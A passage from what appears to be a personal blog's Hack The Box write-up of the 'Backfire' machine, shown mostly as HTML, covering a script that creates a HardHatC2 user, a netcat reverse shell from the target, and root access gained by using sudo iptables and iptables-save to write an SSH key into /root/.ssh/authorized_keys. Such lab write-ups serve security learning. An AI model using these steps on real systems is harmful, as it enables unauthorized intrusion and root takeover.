class="string">&quot;nutzh&quot;</span>  <span class="comment"># you can choose what u want</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+<p>run the script </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python3 HardHat.py </span><br><span class="line"></span><br><span class="line">User nutzh created <span class="comment">#output</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>We authenticate with the newly created user and gain access to the HardHatC2 framework. From there, we interact with the terminal<br>and discover that the user sergej can run iptables as root.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nc -vlnp 4445                                                               </span><br><span class="line">listening on [any] 4445 ...</span><br><span class="line">connect to [10.10.14.225] from (UNKNOWN) [10.10.11.49] 57182</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1842): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">sergej@backfire:~/HardHatC2/HardHatC2Client$ <span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> sergej on backfire:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User sergej may run the following commands on backfire:</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/iptables</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/iptables-save</span><br><span class="line">sergej@backfire:~/HardHatC2/HardHatC2Client$ </span><br></pre></td></tr></table></figure>
+<p>we see that the user sergej can use the iptables and iptables-save as a root<br>so googling a little about this command and we got this<br><a target="_blank" rel="noopener" href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/">https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/</a></p>
+<p>We use the iptables command to modify the &#x2F;root&#x2F;.ssh&#x2F;authorized_keys file and<br>add our SSH public key.</p>
+<p>Generate an SSH Key:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t ecdsa -b 256 -f nutzhroot </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> nutzhroot.pub                        </span><br><span class="line">ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9qQpaXgZeN1WigWRfrcZhTd+/YU9r8KpHKopriKJ4olZf8TrsK+6nUb9+QG/6jPwOaYfd815ZQXb9l2gpEjwc= kali@kali</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Add the Public Key to iptables:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> iptables -A INPUT -i lo -j ACCEPT -m comment --comment $<span class="string">&#x27;\n $SSHkey.pub generated \n&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>Save the Configuration to &#x2F;root&#x2F;.ssh&#x2F;authorized_keys:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> iptables -S</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> iptables-save -f /root/.ssh/authorized_keys</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>SSH as Root with the  generated key</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i nutzhroot root@backfire.htb</span><br><span class="line">Linux backfire 6.1.0-29-amd64 <span class="comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64</span></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">Last login: Mon Jan 20 13:59:29 2025 from 10.10.14.225</span><br><span class="line">root@backfire:~# </span><br></pre></td></tr></table></figure>
+<p>We successfully gain root access to the machine.</p>
+<pre><code>                                                GG!🎉
+</code></pre>
+<p>key takeaways:<br><strong>Enumeration is Key</strong>: Thoroughly enumerate all open ports and services to identify<br>potential attack vectors.<br><strong>Research is Crucial</strong>: Always research the software and frameworks running on the<br>target for known vulnerabilities.<br><strong>Leverage Misconfigurations</strong>: Misconfigurations, such as improper use of iptables,<br>can lead to privilege escalation.<br><strong>Automate Where Possible</strong>: Use scripts and tools to automate exploitation and save time.</p>
+
+</article>
+    
+    
+
+</div>
+<div class="trm-post-next-prev row">
+    <div class="col-lg-12">
+        <!-- title -->
+        <h5 class="trm-title-with-divider">
+            Other Articles
+            <span data-number="02"></span>
+        </h5>
+    </div>
+    
+    
+        <div class="col-lg-6">
+    <div class="trm-blog-card trm-scroll-animation">
+        <a href="/caption/" class="trm-cover-frame trm-anima-link">
+            
+            
+                <img alt="cover" class="no-fancybox" src="https://images.squarespace-cdn.com/content/v1/5fe4caeadae61a2f19719512/e29e6a85-ed60-408c-806b-622a99c34c35/Screenshot+%281730%29.jpg">
+            
+        </a>
+        
+        <div class="trm-card-descr">
+            <div class="trm-label trm-category trm-mb-20">
+                <a href=" /categories/ACTIVE-MACHINE-HTB/">
+                    ACTIVE MACHINE(HTB)
+                </a>
+            </div>
+            <h5>
+                <a href="/caption/" class="trm-anima-link">
+                    Caption
+                </a>
+            </h5>
+            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>25/01/17</li>
+                <li>23:13</li>
+                
+                    <li>1.6k</li>
+                
+                
+                    <li>9</li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+</div>
+
+    
+
+
+
+                    <div class="trm-divider footer-divider"></div>
+
+                    <!-- footer -->
+                    <footer class="trm-footer-card trm-scroll-animation">
+
+    
+
+    
+        <div class="trm-footer-item">
+            <span>© 2024 - 2025</span>
+            <span class="footer-separator"data-separator=" · "></span>
+            <span class="trm-accent-color">NUTZH</span>
+        </div>
+    
+
+      
+
+     
+
+    
+        <div class="trm-footer-item">
+            Keep learning,<br> keep growing,<br> keep moving forward.
+        </div>
+     
+</footer>
+
+<!-- Add Mario here -->
+<div class="mario">
+    <img src="/images/mario-bros.gif" alt="Mario" />
+    <div class="speech-bubble">
+       Hi <br>It's-a me, Mario! 🍄 
+    </div>
+</div>
+
+<!-- Custom CSS -->
+<style>
+    @media screen and (max-width: 1486px) {
+        .mario {
+            display: none; /* Hide Mario on small screens */
+        }
+    }
+    .mario {
+        position: fixed; /* Fix Mario to the screen */
+        left: 10px; /* Position it 20px from the left edge */
+        bottom: 20px; /* Position it 20px from the bottom edge */
+        cursor: pointer; /* Make it interactive */
+        z-index: 1000; /* Ensure it stays on top of other elements */
+        animation: float 3s ease-in-out infinite; /* Add a floating animation */
+    }
+
+    .mario img {
+        width: 160px; /* Adjust the size of the image (smaller) */
+        height: auto; /* Maintain aspect ratio */
+        transition: transform 0.3s ease; /* Add a smooth animation */
+    }
+
+    .mario:hover img {
+        transform: scale(1.2); /* Make Mario grow on hover */
+    }
+
+    /* Speech bubble */
+    .speech-bubble {
+    position: absolute;
+    bottom: 100%; /* Position the bubble above Mario */
+    left: 100%; /* Center the bubble horizontally */
+    transform: translateX(-50%); /* Adjust for centering */
+    background-color: #fff; /* White background */
+    color: #000; /* Black text */
+    padding: 9px; /* Increase padding to make the bubble bigger */
+    border-radius: 10px;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2); /* Add a shadow */
+    font-size: 1.0rem; /* Increase font size */
+    text-align: center;
+    opacity: 0; /* Hide the bubble by default */
+    visibility: hidden; /* Hide the bubble by default */
+    transition: opacity 0.3s ease, visibility 0.3s ease; /* Smooth transition */
+    white-space: nowrap; /* Prevent text from wrapping */
+}
+
+/* Show the speech bubble on hover or click */
+.mario:hover .speech-bubble,
+.mario:active .speech-bubble {
+    opacity: 1; /* Show the bubble */
+    visibility: visible; /* Show the bubble */
+}
+    /* Floating animation */
+    @keyframes float {
+        0%, 100% {
+            transform: translateY(0); /* Start and end at the same position */
+        }
+        50% {
+            transform: translateY(-10px); /* Move Mario up */
+        }
+    }
+</style>
+                    <!-- footer end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+            <!-- body end -->
+
+            
+
+    <div id="post-toc" class="trm-post-toc">
+      <div class="trm-post-toc-header">
+        Article table of contents
+				<span id="post-toc-top">
+					TOP
+				</span>
+      </div>
+      <div class="trm-post-toc-content">
+        <ol class="trm-toc"><li class="trm-toc-item trm-toc-level-2" title="Table of Contents"><a rel="nofollow" class="trm-toc-link" href="#Table-of-Contents"><span class="trm-toc-number">1.</span> <span class="trm-toc-text">Table of Contents</span></a></li><li class="trm-toc-item trm-toc-level-2" title="enumeration nmap"><a rel="nofollow" class="trm-toc-link" href="#enumeration-nmap"><span class="trm-toc-number">2.</span> <span class="trm-toc-text">enumeration nmap</span></a></li><li class="trm-toc-item trm-toc-level-2" title="Exploring Port 8000"><a rel="nofollow" class="trm-toc-link" href="#Exploring-Port-8000"><span class="trm-toc-number">3.</span> <span class="trm-toc-text">Exploring Port 8000</span></a></li><li class="trm-toc-item trm-toc-level-2" title="foothold"><a rel="nofollow" class="trm-toc-link" href="#foothold"><span class="trm-toc-number">4.</span> <span class="trm-toc-text">foothold</span></a></li><li class="trm-toc-item trm-toc-level-2" title="Privilege Escalation"><a rel="nofollow" class="trm-toc-link" href="#Privilege-Escalation"><span class="trm-toc-number">5.</span> <span class="trm-toc-text">Privilege Escalation</span></a></li></ol>
+      </div>
+    </div>
+
+            
+<div class="trm-fixed-container">
+    
+        <div class="trm-fixed-btn post-toc-btn" data-title="Open toc">
+            <i class="iconfont fas fa-th-list"></i>
+        </div>
+    
+    
+        <div class="trm-fixed-btn" data-title="Read Mode" onclick="asyncFun.switchReadMode()">
+            <i class="iconfont fas fa-book-reader"></i>
+        </div>
+    
+    
+        <div class="trm-fixed-btn hidden-md" data-title="Toggle between single-column and double-column" onclick="asyncFun.switchSingleColumn()">
+            <i class="iconfont fas fa-arrows-alt-h"></i>
+        </div>
+    
+    <div id="trm-back-top" class="trm-fixed-btn" data-title="Back To Top">
+        <i class="iconfont fas fa-arrow-up"></i>
+    </div>
+</div>
+        </div>
+      </div>
+      <!-- scroll container end -->
+  </div>
+  <!-- app wrapper end -->
+
+  
+    <div class="trm-search-popup">
+        <div class="trm-search-wrapper">
+            <div class="form trm-search-form">
+                <div class="trm-search-input-icon">
+                    <i class="iconfont fas fa-search"></i>
+                </div>
+                <input class="trm-search-input" type="text" placeholder="Searching...">
+                <div class="trm-search-btn-close">
+                    <i class="iconfont fas fa-times"></i>
+                </div>
+            </div>
+            <div class="trm-search-result-container">
+                <div class="trm-search-empty">
+                    Please enter keywords to search
+                </div>
+            </div>
+            <div class="trm-search-footer">
+                <div class="trm-search-stats"></div>
+                <ul class="trm-search-commands">
+                    <li>
+                        <kbd class="command-palette-commands-key">
+                            <svg width="15" height="15" aria-label="Escape key" role="img">
+                                <g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"
+                                    stroke-width="1.2">
+                                    <path
+                                        d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956">
+                                    </path>
+                                </g>
+                            </svg>
+                        </kbd>
+                        <span class="command-palette-Label">to close</span>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+  <!-- Plugin -->
+
+
+
+
+    
+    
+<script src="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+    
+
+    
+        <script src="/js/plugins/typing.js?v=2.2.4"></script>
+    
+
+    
+        
+<script src="https://unpkg.com/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+
+        <script src="/js/plugins/local_search.js?v=2.2.4"></script>
+    
+
+    <!--  -->
+    
+
+    <!--  -->
+    
+        
+
+        
+    
+
+		
+
+
+
+
+    <!-- Service Worker -->
+    
+    <!-- baidu push -->
+    
+
+
+<script id="async-script" src="/js/main.js?v=2.2.4"></script>
+
+<!-- CDN -->
+
+
+    
+
+    
+
+    
+
+
+
+</body>
+
+</html>
